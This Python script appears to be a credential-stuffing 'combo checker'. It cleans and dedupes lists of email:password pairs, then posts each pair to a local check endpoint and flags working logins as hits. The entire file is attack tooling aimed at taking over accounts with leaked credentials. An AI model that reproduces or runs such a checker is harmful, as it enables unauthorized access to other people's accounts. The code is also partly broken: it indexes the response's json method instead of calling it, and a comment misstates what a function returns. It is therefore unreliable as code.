import requests
from colorama import Fore

def countCombos(filePath):
    try:
        with open(filePath, "r+") as file:
            lines = file.readlines()
            combos = set()

            for line in lines:
                stripped_line = line.strip()
                if ':' in stripped_line:
                    email, password = stripped_line.split(':', 1)
                    
                    if email and password:
                        if '@' in email and '.' in email.split('@')[-1]:
                            combos.add(stripped_line)

            file.seek(0)
            file.truncate()
            for combo in combos:
                file.write(combo + "\n")

            return combos  # Return the count of valid combos
    except FileNotFoundError:
        print(f"Error: The file at {filePath} was not found.")
    except Exception as e:
        print(e)


def checkCombos(combos):
    # Preparing a set for valid combos
    valid_combos = set()
    for combo in combos:
        combo = combo.strip()
        if combo.count(":") == 1:  # Validating combo format
            valid_combos.add(combo)
        else:
            print(f"Invalid combo format detected and excluded: {combo}")

    # Now checking combos
    for combo in valid_combos:
        try:
            email, password = combo.split(":", 1)
            # Change this: using http instead of https
            response = requests.post(
                f"http://localhost:80/check?email={email}&password={password}",
                timeout=5
            )
            response.raise_for_status()  # Raise an error for bad responses
            try:
                f = response.json()["info"]

                if f.lower() == "login failed":
                    print(Fore.RED + f"Bad: {combo}")
                else:
                    print(Fore.YELLOW + f"{response.json["info"]}: {combo}")

            except ValueError:
                print(f"Response is not in valid JSON format: {response.text}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed for {combo}: {e}")